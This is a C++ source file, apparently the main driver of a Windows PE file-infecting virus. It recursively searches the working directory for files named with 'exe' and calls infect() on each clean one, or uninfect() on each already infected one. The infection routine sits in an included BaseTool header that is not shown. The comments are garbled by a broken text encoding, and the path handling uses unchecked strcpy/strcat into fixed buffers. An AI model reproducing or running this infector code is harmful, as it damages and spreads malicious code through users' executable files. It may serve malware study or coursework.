#pragma once
#include <stdio.h>
#include <stdlib.h>
#include "BaseTool.h"
#include <iostream>
#include <io.h>
#include <direct.h>

//#define DEBUG
#define MAX_PATH 100

using namespace std;

void findAllFile(__in const char* path, __in const char* format, __out int* count)
{
	char newpath[200];
	strcpy(newpath, path);
	strcat(newpath, "\\*.*");    // ��Ŀ¼�������"\\*.*"���е�һ������
	int handle;
	_finddata_t findData;
	handle = _findfirst(newpath, &findData);
	if (handle == -1)        // ����Ƿ�ɹ�
	{
		printf("�����ļ�ʧ��\n");
		return;
	}
	while (_findnext(handle, &findData) == 0) {
		if (findData.attrib & _A_SUBDIR) {
			if (strcmp(findData.name, ".") == 0 || strcmp(findData.name, "..") == 0)
				continue;
			strcpy(newpath, path);
			strcat(newpath, "\\");
			strcat(newpath, findData.name);
			findAllFile(newpath, format, count);
		}
		else {
			if (strstr (findData.name, format)) {     //�ж��ǲ���txt�ļ�
				char szPath[200];
				strcpy(szPath, path);
				strcat(szPath, "\\");
				strcat(szPath, findData.name);
				cout << "\n**************************************************\n";
				cout << "Find:" << findData.name << "\t" << path << "\t" << findData.size << " bytes.\n";

				int flag = BaseTool::isSuitable(szPath);
				//Ŀ��δ����Ⱦ, ִ���ļ���Ⱦ
				if (flag == 2)
				{
					printf("infecting %s.....\n", szPath);
					BaseTool pe(szPath);
					pe.infect();
					printf("Finished....\n");
				}
				//Ŀ���Ѿ�����Ⱦ, ִ���ļ��ָ�
				if (flag == 1)
				{
					printf("uninfecting %s.....\n", szPath);
					BaseTool pe(szPath);
					pe.uninfect();
					printf("Finished....\n");
				}
				(*count)++;
			}
		}
	}
	_findclose(handle);    // �ر��������
}


int main()
{
	int count = 0;
	char szPath[MAX_PATH];
	_getcwd(szPath, sizeof(szPath));
	findAllFile(szPath, "exe", &count);
	printf("\n��������%d��PE�ļ�\n", count);

	system("pause");
	return 0;
}

